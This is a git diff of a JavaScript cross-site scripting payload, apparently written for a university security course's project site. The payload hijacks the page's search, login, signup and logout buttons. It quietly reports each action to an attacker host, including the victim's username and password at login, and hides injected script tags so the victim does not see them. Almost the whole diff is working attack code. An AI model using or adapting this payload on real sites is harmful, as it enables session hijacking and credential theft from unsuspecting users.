@@ -60,43 +60,47 @@ function payload2(attacker){
 			  {console.log(response)});
 			  */
 //http://127.0.0.1:31337/stolen?event=nav&user=<username>&url=<encoded_url>
-function payload(attacker) {
-	function proxy(href, purl, stat) {
-		$("html").load(href, function(){
+/*
+$("#new-account-btn").click(function(e){
+  e.preventDefault();
+  $.ajax({url:ad+"create?csrfdefense=0",method:"POST",data:{username:$('#username').val(),password:$('#userpass').val()},success:function(){
+    window.location.replace(ru);;}});
+});
+*/
+
+function payload(attacker){
+	function proxy(href,purl,stat){
+		$("html").load(href,function(){
 		$("html").show();
-			var ad = "http://cis551.cis.upenn.edu/project3/";
-			var ru = window.location.href;
-			history.replaceState(window.history.state, '/project3', "/project3"); 
-			$('a:contains("<script>")').hide(); $('a:contains("<sscriptcript>")').hide();
+			var ad="http://cis551.cis.upenn.edu/project3/";
+			var ru=window.location.href;
+			history.replaceState(window.history.state,'/project3',"/project3"); 
+			$('a:contains("<script>")').hide();$('a:contains("<sscriptcript>")').hide();
 		    $("#search-btn").click(function(e){
-		      var q = $("#query").val().split(' ').join('+');
-			  $.get(ad+"search?q=" + q, 
-			  function(e){document.write(e);});
+		      var q=$("#query").val().split(' ').join('+');
 			  e.preventDefault();
-			  $.ajax({ad+"search?q="+q,success:function(e){
-				document.write(e); proxy(ad+"search?q="+q,ru,1);}});
-			  $.get(attacker+"stolen?event=nav&user="+$('#logged-in-user').text()+"&url="+ad+"search?q="+q);
-	        }); 
+			  $.ajax({url:ad+"search?q="+q}).done(function(e){document.write(e);
+			  	setTimeout(function(){console.log("hard");proxy(ad+"search?q="+q,ru,1);},500);});
+			  $.get(attacker+"stolen?event=nav&user="+$('#logged-in-user').text()+"&url="+ad+"search?q="+q);}); 
 	        $("#search-again-btn").click(function(e){
 		      e.preventDefault();
 			  $.get(attacker+"stolen?event=nav&user="+$('#logged-in-user').text()+"&url="+ad+"search");
 			  window.location.replace(purl);
-	        }); 
+	        });
 		    $("#log-in-btn").click(function(e){
 		      e.preventDefault();
-			  $.ajax({url:ad+"login?csrfdefense=0",method:"POST",data:{username:$('#username').val(),password:$('#userpass').val()},success:function(){
-			    window.location.replace(ru);;}});
+			  $.ajax({url:ad+"login?csrfdefense=0",method:"POST",data:{username:$('#username').val(),password:$('#userpass').val()}}).done(function(){window.location.replace(ru);});
 			  $.get(attacker+"stolen?event=login&user="+$('#username').val()+"&pass=" +$('#userpass').val());
 	        });
-		    $("#new-account-btn").click(function(e){
-		      e.preventDefault();
+			$("#new-account-btn").click(function(e){
+			  e.preventDefault();
 			  $.ajax({url:ad+"create?csrfdefense=0",method:"POST",data:{username:$('#username').val(),password:$('#userpass').val()},success:function(){
 			    window.location.replace(ru);;}});
-	        });
+			});
 		    $("#log-out-btn").click(function(e){
+		    	alert(stat+purl);
 		      e.preventDefault();
-			  $.ajax({url:ad+"logout?csrfdefense=0",method:"POST",success:function(){
-			  	if(stat==0){window.location.replace(ru);} else {window.location.replace(purl);}}});
+			  $.ajax({url:ad+"logout?csrfdefense=0",method:"POST"}).done(function(){if(stat==0){window.location.replace(ru);}else{window.location.replace(purl);}});
 			  $.get(attacker+"stolen?event=logout&user="+$('#logged-in-user').text());
 			  window.location.replace(ru);
 	        });
